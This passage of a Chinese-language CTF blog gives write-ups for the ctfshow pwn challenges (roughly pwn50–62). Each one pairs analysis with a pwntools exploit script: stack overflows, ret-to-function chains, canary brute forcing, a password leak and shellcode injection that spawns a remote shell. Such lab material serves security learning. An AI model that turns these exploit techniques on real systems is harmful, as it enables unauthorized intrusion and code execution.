class="line">shellcode_addr = 0x602000 - 0x100</span><br><span class="line">payload = offset*b&#x27;a&#x27; + p64(pop_rdi_ret_addr) + p64(shellcode_addr) + p64(gets_addr) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">#p.recvuntil(&quot;Hello CTFshow&quot;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">payload = cyclic(offset) + p64(shellcode_addr)</span><br><span class="line">#p.recvuntil(&quot;Hello CTFshow&quot;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="pwn51"><a href="#pwn51" class="headerlink" title="pwn51"></a>pwn51</h4><p>反编译了一下，基本看不懂，虽然看出来是c++的std库，但是没怎么学过，所以正好把函数都熟悉一下吧</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">memset函数</span><br><span class="line">一个复制函数，一般用于快速初始化大块内存为0，如memset(s,0,sizeof(s))，存在溢出风险，因为它不检查是否越界，但是size一般是用sizeof()计算出来的，比较难碰到可以溢出的情况吧，当然如果s可控的话说不定是可以的？</span><br><span class="line"></span><br><span class="line">std::string::operator=(a,b)函数</span><br><span class="line">string类的赋值语句</span><br><span class="line">std::string::operator=(&amp;unk_804D0A0, &amp;unk_804A350); </span><br><span class="line">这里表示把&amp;unk_804A350赋值给&amp;unk_804D0A0，即&amp;unk_804D0A0=&amp;unk_804A350</span><br><span class="line"></span><br><span class="line">std::string::operator+=(a,b)函数</span><br><span class="line">string类的连接语句，就是把b连接到a的后面</span><br><span class="line">std::string::operator+=(&amp;unk_804D0A0, s)，把s连接到$unk_804D0A0后面，即&amp;unk_804D0A0+=s</span><br><span class="line"></span><br><span class="line">std::string::basic_string(a,b)函数</span><br><span class="line">std::string::basic_string(v10, &amp;unk_804D0B8)，定义v10为一个string对象并初始化为$unk_804D0B8，就是string v8=&amp;unk_804D0B8</span><br><span class="line"></span><br><span class="line">std::string::~string(v10)</span><br><span class="line">结束对象生命周期的函数，string类的析构函数</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">看麻了，看了两天也没看懂，放弃了，老老实实看看wp吧，从解题入手，看代码太痛苦了</span><br></pre></td></tr></table></figure>

<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240708183506751.png" alt="image-20240708183506751"><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240708184040986.png" alt="image-20240708184040986"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">解题思路：当然还是栈溢出，从反编译出来的代码中可以看到，有一个read函数，大小为0x20，s到ebp的返回函数的距离为0x6c+4，所以此处read函数是安全的，不安全的是最底下的strcpy函数，strcpy本身是一个不安全的函数，如果v4的长度比s长很多，达到了0x6c+4，那自然就可以覆盖到返回函数了，所以此题的思路是这样，并且该题中还有一个后门函数system，所以解法就是strcpy溢出返回到system函数</span><br></pre></td></tr></table></figure>

<p>所以在中间那段看不懂的代码中到底发生了什么使得v4变得那么长呢？</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">反正看wp的意思是输入I就会变成IronMan，至于怎么变出来的，没看懂，我的评价是c++乱七八糟的，研究了半天也没看出来</span><br></pre></td></tr></table></figure>

<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240708190542121.png" alt="image-20240708190542121"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这个函数是用来查找字符串里面有没有I的（我猜），然后返回v10的值才能进入if</span><br></pre></td></tr></table></figure>

<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240708190729973.png" alt="image-20240708190729973"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这个部分用于把I换成IronMan，除此之外啥也没看出来，感觉说不定这道题是fuzz出来的</span><br></pre></td></tr></table></figure>

<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240708191305778.png" alt="image-20240708191305778"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#解题脚本：</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;,&quot;28309&quot;)</span><br><span class="line">elf = ELF(&quot;../pwn51&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">offset = 0x6c + 0x4 # 112字节</span><br><span class="line">#一个I可以变成一个IronMan，所以每一个I增加了6个字节，read为0x20个字节，需要预留4个字节给system，剩下16个字节如果都是I的话就刚好是16*7=112字节</span><br><span class="line">system_addr = 0x804902E</span><br><span class="line">payload = 16*b&#x27;I&#x27; + p32(system_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="pwn52"><a href="#pwn52" class="headerlink" title="pwn52"></a>pwn52</h4><p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240710120137619.png" alt="image-20240710120137619"><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240710120148495.png" alt="image-20240710120148495">先利用gets的栈溢出漏洞跳转到flag函数，再传入两个参数，使其满足a1&#x3D;&#x3D;876&amp;a2&#x3D;&#x3D;877的条件即可，poc就是非常简单的板子</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;,&#x27;&#x27;)</span><br><span class="line">elf = ELF(&#x27;../pwn52&#x27;)</span><br><span class="line"></span><br><span class="line">offset = 0x6c + 0x4</span><br><span class="line">flag_addr = elf.sym[&#x27;flag&#x27;]</span><br><span class="line">payload = cyclic(offset) + p32(flag_addr) + cyclic(0x4) + p32(876) + p32(877)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="pwn53"><a href="#pwn53" class="headerlink" title="pwn53"></a>pwn53</h4><p>本题其实是模拟了一个canary程序，就是检测栈溢出的，忘记的请看前面或者自己搜，大概就是给出了一个值，如果你栈溢出修改到这个值但是它的原来的不一样，就会报错，所以这里的重点是怎么使得修改之后的值跟原来的一样</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240710154854504.png" alt="image-20240710154854504"></p>
<p>从这张图可以看到global_canary是从这个文件里面读取的一个静态值（4个字节）</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240710154934297.png" alt="image-20240710154934297"></p>
<p>漏洞函数ctfshow，漏洞点在第二个read函数，因为read的第三个参数是可控的，从第一个read函数读取v2之后，再使用sscanf函数从v2里面读取出nbytes，然后if检测canary是否被修改，本题的后门为flag函数，这个很简单，就是跳转到flag函数即可，难点在于如何获得canary</p>
<p>在以下脚本中使用的是单位爆破的方式（其实下面的脚本是仿造官方wp的）。首先需要明确的一点是canary是本来就存在在内存里面的，所以我们可以通过先修改第一位看会不会报错的方式获得canary的第一位，以此类推可以获得canary的值（比我想到的全排列的方式要快很多）。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注意offset的计算，刚开始是0x30+0x4，然后s1(canary)是从0x10+0x4开始的，payload应该为0x20*&#x27;a&#x27; + canary(4byte) + 0x10&#x27;a&#x27; + flag_addr</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># 爆破canary</span><br><span class="line">canary = b&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">offset = 0x20</span><br><span class="line">for i in range(4):</span><br><span class="line">	for j in range(0xFF):</span><br><span class="line">		context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;critical&#x27;)</span><br><span class="line">		p = remote(&#x27;pwn.challenge.ctf.show&#x27;,&#x27;28158&#x27;)</span><br><span class="line">		#elf = ELF(&#x27;../pwn53&#x27;)</span><br><span class="line">		# 在&gt;之后发送-1，就是read的第三个参数，-1是0xffffffff，其实随便整个大点的数也一样</span><br><span class="line">		p.sendlineafter(&#x27;&gt;&#x27;,&#x27;-1&#x27;)</span><br><span class="line">		payload = cyclic(offset) + canary + p8(j)</span><br><span class="line">		# sendlineafter和sendafter的区别在于payload的最后有没有加换行符，此处使用的是sendafter</span><br><span class="line">		p.sendafter(&#x27;$ &#x27;,payload)</span><br><span class="line">		res = p.recv()</span><br><span class="line">		if b&#x27;Canary Value Incorrect!&#x27; not in res:</span><br><span class="line">			canary += p8(j)</span><br><span class="line">			print(canary)</span><br><span class="line">			break</span><br><span class="line">		p.close()</span><br><span class="line">print(canary)</span><br><span class="line"></span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;,&#x27;28158&#x27;)</span><br><span class="line">elf = ELF(&#x27;../pwn53&#x27;)</span><br><span class="line">flag_addr = elf.sym[&#x27;flag&#x27;]</span><br><span class="line">payload = cyclic(offset) + canary + cyclic(0x10) + p32(flag_addr)</span><br><span class="line">p.sendlineafter(&#x27;&gt;&#x27;,&#x27;-1&#x27;)</span><br><span class="line">p.sendlineafter(&#x27;$ &#x27;,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="pwn54"><a href="#pwn54" class="headerlink" title="pwn54"></a>pwn54</h4><p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240710171135017.png" alt="image-20240710171135017"></p>
<p>这道题感觉跟函数的特性关系比较大，所以稍微补全一下知识点</p>
<h5 id="strcat函数"><a href="#strcat函数" class="headerlink" title="strcat函数"></a>strcat函数</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">连接两个字符串，第一个参数作为主体，第二个参数连接在第一个参数的后面，连接的判断条件是\x00，替代掉第一个参数的\x00字符，然后把第二个参数连接在第一个参数后面，如果第一个参数的大小不够的话就会出现非预期</span><br></pre></td></tr></table></figure>

<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240710171726580.png" alt="image-20240710171726580"></p>
<h5 id="fgets函数"><a href="#fgets函数" class="headerlink" title="fgets函数"></a>fgets函数</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">从文件流中读取字符串，格式为fgets(buf,size,stream)，三个参数分别为存储字符串，读取的最大字符数，文件流。需要注意的是实际上fgets最多只能读取n-1个字符，因为fgets返回的字符串必须以\x00结尾。</span><br><span class="line">fgets读取结束的条件：</span><br><span class="line">读取到\n，读取了n-1个字符，读取到EOF</span><br></pre></td></tr></table></figure>

<h5 id="puts函数"><a href="#puts函数" class="headerlink" title="puts函数"></a>puts函数</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">puts函数输出字符串直到遇到\x00字符</span><br></pre></td></tr></table></figure>

<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240710172536912.png" alt="image-20240710172536912"></p>
<p>解题思路</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过main函数21行的strcat函数，连接起v5和,\nInput your Password.。由于v5的大小是256个字节，所以连接后\x00字符会被,代替。v5和s是连在一起的，在第30行puts的时候就会把s一起puts出来（因为puts要遇到\x00才停下），s就是password，获取s之后直接登录就好了</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;,&#x27;28171&#x27;)</span><br><span class="line">offset = 0x160 - 0x60</span><br><span class="line">payload = cyclic(offset)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"># v5是以aa,结尾的，后面的就是password，读取password重新连接，任意用户名加password成功获取flag</span><br><span class="line">p.recvuntil(&#x27;aa,&#x27;)</span><br><span class="line">password = p.recv(0x40)</span><br><span class="line">print(password)</span><br><span class="line">p.close()</span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;,&#x27;28171&#x27;) </span><br><span class="line">p.sendline(&#x27;zx&#x27;)</span><br><span class="line">p.sendline(password)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="pwn55"><a href="#pwn55" class="headerlink" title="pwn55"></a>pwn55</h4><p>很ez的栈溢出</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240710211230117.png" alt="image-20240710211230117"></p>
<p>ctfshow函数栈溢出跳转</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240710211320279.png" alt="image-20240710211320279"></p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240710211336370.png" alt="image-20240710211336370"></p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240710211350269.png" alt="image-20240710211350269"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">解题思路：栈溢出到flag_func1函数使flag1=1，再跳转到flag_func2函数并传入参数使flag2=1，再跳转到flag函数并传入参数得到flag</span><br><span class="line">tips:flag1和flag2都是位于.bss区的未初始化的全局变量</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;,&#x27;28279&#x27;)</span><br><span class="line">elf = ELF(&#x27;../pwn55&#x27;)</span><br><span class="line"></span><br><span class="line">offset = 0x2c + 0x4</span><br><span class="line">flag_func1_addr = elf.sym[&#x27;flag_func1&#x27;]</span><br><span class="line">flag_func2_addr = elf.sym[&#x27;flag_func2&#x27;]</span><br><span class="line">flag_addr = elf.sym[&#x27;flag&#x27;]</span><br><span class="line">parameter = 0xBDBDBDBD</span><br><span class="line">parameter2 = 0xACACACAC</span><br><span class="line">payload = cyclic(offset) + p32(flag_func1_addr) + p32(flag_func2_addr) + p32(flag_addr) + p32(parameter2) + p32(parameter)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="pwn56"><a href="#pwn56" class="headerlink" title="pwn56"></a>pwn56</h4><p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240710221823690.png" alt="image-20240710221823690"></p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240710223521816.png" alt="image-20240710223521816"></p>
<p>看到代码就是简单的起了一个shell，直接nc连接就可以getshell了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tips:execve的系统调用号为11</span><br></pre></td></tr></table></figure>

<h4 id="pwn57"><a href="#pwn57" class="headerlink" title="pwn57"></a>pwn57</h4><p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240710223145107.png" alt="image-20240710223145107"></p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240710223250519.png" alt="image-20240710223250519"></p>
<p>跟上题差不多，一样是nc就可以获得flag的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tips:execve的系统调用号为59</span><br></pre></td></tr></table></figure>

<h4 id="pwn58"><a href="#pwn58" class="headerlink" title="pwn58"></a>pwn58</h4><p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240710224155390.png" alt="image-20240710224155390"></p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240710224218788.png" alt="image-20240710224218788"></p>
<p>没有反编译的伪代码，好难受，不过看看汇编可能也能看出来，就是用gets读取之后，puts，然后再call。就是说eval了我们输入的代码，这里可以用shellcode来解（因为没有nx）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;,&#x27;28230&#x27;)</span><br><span class="line">elf = ELF(&#x27;../pwn58&#x27;)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>下班（2024.7.10)，无法反编译的原因在ida无法确定eax的位置，eax是动态的</p>
<h4 id="pwn59"><a href="#pwn59" class="headerlink" title="pwn59"></a>pwn59</h4><p>跟上题差不太多吧，只是换成了64bit的程序，还是一样用pwntools自带的shellcode就可以解决</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;,&#x27;28253&#x27;)</span><br><span class="line">elf = ELF(&#x27;../pwn59&#x27;)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="pwn60"><a href="#pwn60" class="headerlink" title="pwn60"></a>pwn60</h4><p>简单的shellcode（如何成为shellcodeMaster？？？）</p>
<p>刚开始就麻爪了，因为就只有一个main函数里的东西，但是又没有什么可以利用的函数，后面才想起来，这道题是没有开nx的（惯性思维了）</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240711165944986.png" alt="image-20240711165944986"></p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240711170107717.png" alt="image-20240711170107717"></p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240711170206974.png" alt="image-20240711170206974"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">解题思路：这里栈溢出写入s，然后s会被strncpy复制给buf2，buf2在bss段，是有执行权限的（为什么我这里没有呢，因为我用的不是官方给的虚拟机，大概是版本不一样）</span><br></pre></td></tr></table></figure>

<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240711214309756.png" alt="image-20240711214309756"></p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240711213506520.png" alt="image-20240711213506520"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">此时在计算偏移值offset时有一个很大的坑点（就是如果esp不是十六字节对齐，即esp不是0结尾的地址的话，在计算offset时就不是0x64了）</span><br><span class="line">假设esp是以8结尾的（事实上这个程序就是这样），那么esp经过and和add两个指令之后，就不止差了0x80，而是差了0x80+0x8的距离。（自己算一下，就是这样）</span><br><span class="line">然后又因为下面gets的时候给的s地址是[esp+80h+s]，s是-64h，所以这里s跟ebp的偏移值也就是脚本中的offest实际上是(0x88-0x80+0x64+0x4)，不理解的话可以画一个栈图，可能比较直观</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;,&#x27;28257&#x27;)</span><br><span class="line">elf = ELF(&#x27;../pwn60&#x27;)</span><br><span class="line"></span><br><span class="line">offset = 0x70</span><br><span class="line"></span><br><span class="line"># 0xffffcf78是ebp_addr，从gdb调出来的，因为刚开始看stack可以执行，但是失败了，应该是因为ebp是不固定的</span><br><span class="line">#s_addr = 0xffffcf78 + 0x4 -offset</span><br><span class="line"></span><br><span class="line">buf2_addr = 0x0804A080</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">#payload = shellcode.ljust(offset,b&#x27;a&#x27;) + p32(s_addr)</span><br><span class="line">payload = shellcode.ljust(offset,b&#x27;a&#x27;) + p32(buf2_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>感觉摸得一批（一天只写了两道，太奇怪了，今天还搞了一下搜索引擎，不然搜不到自己的博客）– 2024.7.11</p>
<h4 id="pwn61"><a href="#pwn61" class="headerlink" title="pwn61"></a>pwn61</h4><p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240712154135785.png" alt="image-20240712154135785"></p>
<p>开启了pie，nx没开，开启了pie之后地址就会发生变化，但是没关系，可以看到题目中很明显的打印出了v5的地址，所以pie并不需要我们担心</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">解题思路：获得程序中得到的v5的地址之后，写入shellcode</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">elf = ELF(&#x27;../pwn61&#x27;)</span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;,&#x27;28255&#x27;)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#x27;[&#x27;)</span><br><span class="line">#从进程 p 中接收数据，直到遇到字符 ]，并且丢弃这个结束字符 ]，这里读取到了v5的地址</span><br><span class="line">v5 = p.recvuntil(&#x27;]&#x27;,drop=True)</span><br><span class="line">v5 = int(v5,16)</span><br><span class="line">print(v5)</span><br><span class="line">#计算偏移值，生成shellcode</span><br><span class="line">offset = 0x10 + 0x8</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">#由于buf被使用之后会被回收，此处将shellcode写在返回地址的下一个地址，也就是v5+0x10+0x8+0x8的位置</span><br><span class="line">payload = cyclic(0x10+0x8) + p64(v5 + 0x20) + shellcode</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="pwn62"><a href="#pwn62" class="headerlink" title="pwn62"></a>pwn62</h4><p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240801133027641.png" alt="image-20240801133027641"></p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240801135140357.png" alt="image-20240801135140357"></p>
<p>与上题最大的不同在于，上题是使用的gets执行栈溢出，不存在对shellcode的长度的要求，而本题中buf为0x10，再加上ebp和ret的地址，shellcode之外的长度为0x20，剩下给shellcode的长度只剩下0x18，也就是24个bytes</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">elf = ELF(&#x27;../pwn62&#x27;)</span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;,&#x27;28155&#x27;)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#x27;[&#x27;)</span><br><span class="line">#从进程 p 中接收数据，直到遇到字符 ]，并且丢弃这个结束字符 ]，这里读取到了v5的地址</span><br><span class="line">buf = p.recvuntil(&#x27;]&#x27;,drop=True)</span><br><span class="line">buf = int(buf,16)</span><br><span class="line">#计算偏移值，生成shellcode</span><br><span 